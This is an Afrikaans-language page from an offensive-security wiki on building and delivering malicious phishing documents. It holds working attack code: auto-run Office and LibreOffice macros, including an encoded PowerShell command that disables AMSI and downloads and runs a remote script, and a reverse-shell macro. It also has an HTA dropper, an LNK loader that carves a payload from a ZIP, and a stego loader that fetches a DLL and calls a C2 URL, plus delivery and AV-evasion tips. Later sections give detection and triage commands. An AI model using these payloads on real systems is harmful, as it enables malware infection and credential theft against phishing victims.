# Phishing Files en -dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office-dokumente

Microsoft Word voer lêerdata-validering uit voordat ’n lêer oopgemaak word. Datavalidering word uitgevoer in die vorm van datastruktuur-identifikasie teen die OfficeOpenXML-standaard. Indien enige fout tydens die datastruktuur-identifikasie voorkom, sal die lêer wat ontleed word nie oopgemaak word nie.

Word-lêers wat makro’s bevat, gebruik gewoonlik die `.docm`-uitbreiding. Dit is egter moontlik om die lêer te hernoem deur die lêeruitbreiding te verander en steeds hul makro-uitvoeringsvermoëns te behou.\
Byvoorbeeld, ’n RTF-lêer ondersteun nie makro’s nie, volgens ontwerp, maar ’n DOCM-lêer wat na RTF hernoem is, sal deur Microsoft Word hanteer word en sal makro-uitvoering kan uitvoer.\
Dieselfde interne werking en meganismes is van toepassing op alle sagteware in die Microsoft Office Suite (Excel, PowerPoint, ens.).

Jy kan die volgende opdrag gebruik om na te gaan watter uitbreidings deur sommige Office-programme uitgevoer gaan word:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-lêers wat na 'n afgeleë template verwys (File –Options –Add-ins –Manage: Templates –Go) wat macros insluit, kan macros ook “uitvoer”.

### Eksterne beeldlaai

Gaan na: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, en **Filename or URL**:_ http://<ip>/whatever

![Office Documents - Eksterne beeldlaai: Gaan na: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Dit is moontlik om macros te gebruik om arbitrêre kode vanuit die dokument uit te voer.

#### Outolaai-funksies

Hoe meer algemeen hulle is, hoe waarskynliker is dit dat die AV hulle sal opspoor.

- AutoOpen()
- Document_Open()

#### Macros-kodevoorbeelde
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Verwyder metadata handmatig

Gaan na **Lêer > Info > Inspekteer dokument > Inspekteer dokument**, wat die Dokumentinspekteur sal oopmaak. Klik **Inspekteer** en dan **Verwyder alles** langs **Dokumenteienskappe en persoonlike inligting**.

#### Dokumentuitbreiding

Wanneer jy klaar is, kies die **Stoor as-tipe**-aftreklys en verander die formaat van **`.docx`** na Word 97-2003 **`.doc`**.\
Doen dit omdat jy **nie Macros binne ’n `.docx` kan stoor nie** en daar ’n **stigma** **rondom** die makro-geaktiveerde **`.docm`**-uitbreiding is (die duimnaelikoon het byvoorbeeld ’n groot `!`, en sommige web-/e-pos-gateways blokkeer dit heeltemal). Daarom is hierdie **verouderde `.doc`-uitbreiding die beste kompromie**.

#### Kwaadwillige Macro Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT outomatiese uitvoer-Macros (Basic)

LibreOffice Writer-dokumente kan Basic-Macros insluit en dit outomaties uitvoer wanneer die lêer oopgemaak word deur die makro aan die **Open Document**-gebeurtenis te bind (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> ’n Eenvoudige reverse shell-makro lyk soos volg:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Let op die dubbele aanhalingstekens (`""`) binne die string – LibreOffice Basic gebruik dit om letterlike aanhalingstekens te ontsnap, dus behou payloads wat eindig met `...==""")` beide die binneste opdrag en die Shell-argument gebalanseer.

Afleweringswenke:

- Stoor as `.odt` en koppel die macro aan die documentgebeurtenis sodat dit onmiddellik uitgevoer word wanneer dit oopgemaak word.
- Wanneer jy met `swaks` e-pos stuur, gebruik `--attach @resume.odt` (die `@` is nodig sodat die lêerbytes, nie die lêernaamstring nie, as die aanhegsel gestuur word). Dit is krities wanneer SMTP-bedieners misbruik word wat arbitrêre `RCPT TO`-ontvangers sonder validering aanvaar.

## HTA-lêers

'n HTA is 'n Windows-program wat **HTML en scripting languages (soos VBScript en JScript) kombineer**. Dit genereer die gebruikerskoppelvlak en word as 'n "fully trusted"-toepassing uitgevoer, sonder die beperkings van 'n blaaier se sekuriteitsmodel.

'n HTA word met **`mshta.exe`** uitgevoer, wat tipies saam met **Internet Explorer** geïnstalleer word, wat **`mshta` afhanklik maak van IE**. As dit dus gedeïnstalleer is, sal HTAs nie kan uitvoer nie.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forcing NTLM Authentication

Daar is verskeie maniere om **NTLM authentication "remotely" te forceer**; jy kan byvoorbeeld **invisible images** by e-posse of HTML voeg waartoe die gebruiker toegang sal kry (selfs HTTP MitM?). Of stuur die slagoffer die **address of files** wat ’n **authentication** sal **trigger** net deur die **folder** oop te maak.

**Check hierdie idees en meer op die volgende bladsye:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Moenie vergeet dat jy nie net die hash of die authentication kan steel nie, maar ook **NTLM relay attacks kan uitvoer**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Hoogs effektiewe campaigns lewer ’n ZIP wat twee legitieme decoy documents (PDF/DOCX) en ’n malicious .lnk bevat. Die truuk is dat die werklike PowerShell loader binne die ZIP se raw bytes ná ’n unieke marker gestoor word, en die .lnk dit carve en volledig in memory uitvoer.<sup>[[2]](#references)</sup>

Tipiese flow wat deur die .lnk PowerShell one-liner geïmplementeer word:

1) Locate the original ZIP in common paths: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, and the parent of the current working directory.
2) Read the ZIP bytes and find a hardcoded marker (e.g., xFIQCV). Everything after the marker is the embedded PowerShell payload.
3) Copy the ZIP to %ProgramData%, extract there, and open the decoy .docx to appear legitimate.
4) Bypass AMSI for the current process: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuscate the next stage (e.g., remove all # characters) and execute it in memory.

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Aantekeninge
- Delivery misbruik dikwels betroubare PaaS-subdomeine (bv. *.herokuapp.com) en kan payloads beheer (dien goedaardige ZIP-lêers volgens IP/UA).
- Die volgende stadium dekripteer gereeld base64/XOR-shellcode en voer dit uit via Reflection.Emit + VirtualAlloc om skyfspore te minimaliseer.

Persistence wat in dieselfde ketting gebruik word
- COM TypeLib-hijacking van die Microsoft Web Browser-beheerder sodat IE/Explorer of enige toepassing wat dit insluit, die payload outomaties weer begin laai.<sup>[[2]](#references)[[4]](#references)</sup> Sien besonderhede en gereed-vir-gebruik-opdragte hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Opsporing/IOCs
- ZIP-lêers wat die ASCII-merkerstring (bv. xFIQCV) bevat wat aan die argiefdata geheg is.
- .lnk wat ouer-/gebruikervouers opsom om die ZIP op te spoor en ’n lokdokument oopmaak.
- AMSI-peutery via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Langdurige besigheidsdrade wat eindig met skakels wat onder vertroude PaaS-domeine gehuisves word.

## LNK-lokmiddel-eerste-staging → persistence via geskeduleerde taak → vertroude CPL-side-loading

Nog ’n terugkerende patroon is ’n **dokument-nabootsende `.lnk`** wat onmiddellik ’n goedaardige lokmiddel oopmaak terwyl dit die werklike ketting in die agtergrond voorberei.<sup>[[3]](#references)</sup>

Waargenome werkvloei:
1. Die kortpad **doen hom voor as ’n PDF** en gebruik `conhost.exe` of ’n soortgelyke proxy om ’n geobfuskeerde PowerShell-downloader te begin.
2. Die PowerShell fragmenteer ooglopende tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) sodat eenvoudige opsporings wat na `iwr`, `gci`, `ren`, `cpi` of `schtasks` soek, die opdrag mis.
3. Die stager laai eers die **lokdokument** af, maak dit vir die slagoffer oop, en rekonstrueer daarna die kwaadwillige lêers in die agtergrond.
4. Payloads kan met **rommeluitbreidings** geskryf en daarna hernoem word deur vulkarakters te verwyder, wat die verskyning van ooglopende `.exe`-/`.cpl`-artefakte vertraag.
5. Persistence word gevestig met ’n **geskeduleerde taak gebaseer op minute** wat ’n vertroude gasheerbinêre lêer vanaf ’n gebruiker-skryfbare pad begin.

Minimale opsporingsaanwysings uit hierdie patroon:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
’n Nuttige staging-uitleg om te herken, is:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` of `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Waarom die tweede stadium stealthy is

In die Rapid7-gevallestudie het die scheduled task herhaaldelik **`Fondue.exe`** vanaf `C:\Users\Public\` geloods. Omdat **`APPWIZ.cpl`** langsaan gestage is en **`RunFODW`** uitgevoer het, het die trusted Microsoft binary die attacker se CPL gelaai in plaas van die legitieme stelselkopie.

Die CPL:
- Lees ’n **AES-256-CBC**-blob vanaf `C:\Windows\Tasks\editor.dat`
- Decrypt dit deur **Windows CNG / `bcrypt.dll`**
- Allokeer uitvoerbare geheue en kopieer die gedecrypte shellcode
- Voer dit indirek uit deur die shellcode-pointer as die callback vir **`EnumUILanguagesW`** deur te gee

Daardie laaste stap is afsonderlik die moeite werd om na te vors: malware vermy dikwels ’n direkte `((void(*)())buf)()`-sprong en misbruik eerder ’n **legitimate callback-taking WinAPI** om uitvoering oor te dra.

Die gedecrypte payload in hierdie campaign was **Donut** shellcode, wat daarna die finale PE volledig in geheue gemap het en **AMSI/WLDP/ETW** in die huidige proses gepatch het voordat dit uitvoering oorgedra het. Vir meer diepgaande notas oor side-loading en memory-resident post-processing, sien:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktiese hunting-pivots:
- `.lnk` wat `powershell.exe` of `conhost.exe` spawn, gevolg deur ’n sigbare decoy-dokument.
- Kortstondige downloads na **`C:\Users\Public\`**, gevolg deur onmiddellike hernoemings vanaf nonsens-uitbreidings.
- Scheduled tasks met alledaagse name soos `GoogleErrorReport` wat vanaf **user-writable directories** uitgevoer word.
- Trusted binaries wat **`.cpl` / `.dll`**-lêers vanaf dieselfde nie-stelselgids laai.
- Base64-teksblobs wat onder **`C:\Windows\Tasks\`** geskryf en daarna deur die side-loaded module gelees word.

## Steganography-delimited payloads in beelde (PowerShell stager)

Onlangse loader chains lewer ’n geobfuskeerde JavaScript/VBS wat ’n Base64 PowerShell stager decodeer en uitvoer. Daardie stager download ’n beeld (dikwels GIF) wat ’n Base64-gekodeerde .NET DLL bevat wat as gewone teks tussen unieke begin-/eindmerkers versteek is. Die script soek hierdie delimiters (voorbeelde wat in die wild gesien is: «<<sudo_png>> … <<sudo_odt>>>»), ekstraheer die teks tussenin, Base64-decodeer dit na bytes, laai die assembly in-memory en invoke ’n bekende entry method met die C2 URL.<sup>[[5]](#references)</sup>

Werkvloei
- Stadium 1: Archived JS/VBS dropper → decodeer ingebedde Base64 → launch PowerShell stager met -nop -w hidden -ep bypass.
- Stadium 2: PowerShell stager → download beeld, carve marker-delimited Base64, laai die .NET DLL in-memory en roep sy method (bv. VAI) met die C2 URL en opsies.
- Stadium 3: Loader haal die finale payload op en inject dit tipies deur process hollowing in ’n trusted binary (gewoonlik MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Sien meer oor process hollowing en trusted utility proxy execution hier:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell-voorbeeld om ’n DLL uit ’n beeld te carve en ’n .NET method in-memory te invoke:

<details>
<summary>PowerShell stego payload extractor en loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notas
- Dit is ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Markers verskil tussen campaigns.
- AMSI/ETW bypass en string deobfuscation word algemeen toegepas voordat die assembly gelaai word.
- Hunting: skandeer afgelaaide beelde vir bekende delimiters; identifiseer PowerShell wat toegang tot beelde verkry en Base64 blobs onmiddellik decodeer.

Sien ook stego tools en carving-tegnieke:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

’n Herhalende aanvanklike stage is ’n klein, sterk-obfuscated `.js` of `.vbs` wat binne ’n argief afgelewer word. Die enigste doel daarvan is om ’n ingebedde Base64-string te decodeer en PowerShell met `-nop -w hidden -ep bypass` te launch om die volgende stage oor HTTPS te bootstrap.<sup>[[5]](#references)</sup>

Skeleton-logika (abstrak):
- Lees die eie lêerinhoud
- Vind ’n Base64 blob tussen junk strings
- Decodeer na ASCII PowerShell
- Executeer met `wscript.exe`/`cscript.exe` wat `powershell.exe` invoke

Hunting-aanwysers
- Geargiveerde JS/VBS-aanhegsels wat `powershell.exe` spawn met `-enc`/`FromBase64String` in die command line.
- `wscript.exe` wat `powershell.exe -nop -w hidden` vanuit user temp paths launch.

## MSC-dokumente as execution containers (GrimResource)

Microsoft Management Console-lêers (`.msc`) is XML-consoledefinisies wat normaalweg deur `mmc.exe` oopgemaak word. **GrimResource** weaponize ’n `StringTable`-verwysing na ’n `apds.dll`-resource wat ’n ou XSS-primitive bevat, sodat ’n gebruiker wat die crafted console oopmaak, JavaScript binne `mmc.exe` laat run. Waargenome samples het `transformNode`-gebaseerde obfuscation met **DotNetToJScript** gekombineer om ’n .NET-payload te instantiate sonder die gewone Office-macro path.<sup>[[9]](#references)</sup>

Vir static triage, behandel ’n untrusted MSC as teks en **moet dit nie dubbelklik nie**:<sup>[[9]](#references)</sup>
```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```
Hoë-sein runtime-pivots is `mmc.exe` wat die CLR- of scriptkomponente laai, netwerkverbindings skep, of `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` of ’n onverwagte uitvoerbare lêer skep. Die formaat is legitiem, dus moet detections **oorsprong + verdagte XML-/script-inhoud + `mmc.exe`-gedrag** korreleer, eerder as om elke MSC te blokkeer.<sup>[[9]](#references)</sup>

## PDF/QR-redirectors en payload-gating

’n PDF het nie ’n exploit nodig om nuttig te wees nie. Onlangse veldtogte plaas ’n **QR-kode of gewone skakel** in ’n dokument wat onskuldig lyk, verskuif die blaaiersessie weg van e-posbeheermaatreëls, en verpersoonlik die bestemming met die ontvanger se adres. Microsoft het in 2025 PDFs gedokumenteer waarvan die QR-URL’s uniek per ontvanger was en na RaccoonO365 credential-harvesting-infrastruktuur gelei het; ’n parallelle ketting het IP-/omgewingsgating gebruik om ’n JavaScript/MSI-pad aan geselekteerde besoekers terug te stuur, maar ’n onskadelike PDF aan skandeerders of kliënte wat nie toegelaat is nie.<sup>[[10]](#references)</sup>

Doen Triage van beide PDF-aksies en gerenderde QR-kodes. ’n QR-kode kan as vektorgrafika geteken wees eerder as wat dit as ’n ekstraheerbare beeld gestoor word, dus moet elke bladsy gerasteriseer word, benewens die ekstrahering van ingebedde beelde:
```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```
Inspekteer gedekodeerde bestemmings en herleidings vanaf ’n geïsoleerde ontledingstelsel sonder om te autentiseer. Nuttige hunting-kenmerke sluit in PDF’s wat slegs QR-kodes bevat met byna leë posboodskappe, die ontvanger-e-posadres wat in ’n navraagparameter ingebed is, verskeie herleidings deur betroubare hosting, en verskillende inhoud wat volgens IP, geoligging, koekies, verwyser of user agent teruggestuur word. Vergelyk versoeke met beheerde profiele, omdat ’n enkele sandbox-fetch moontlik slegs die lokinhoud ontvang.<sup>[[10]](#references)</sup>

## Windows-lêers om NTLM-hashes te steel

Kyk na die bladsy oor **plekke om NTLM-creds te steel**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice-makro → IIS-webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine-veldtog: ’n Gesofistikeerde Phishing-aanval gemik op Amerikaanse maatskappye](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Nasporing van Dropping Elephant se tradecraft deur ’n China-tema-loaderketting](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Kaping van die TypeLib – Nuwe COM-persistence-tegniek (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader lewer ’n reeks infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console vir aanvanklike toegang en ontduiking](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Threat actors benut belastingseisoen om belasting-tema-phishingveldtogte te ontplooi](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
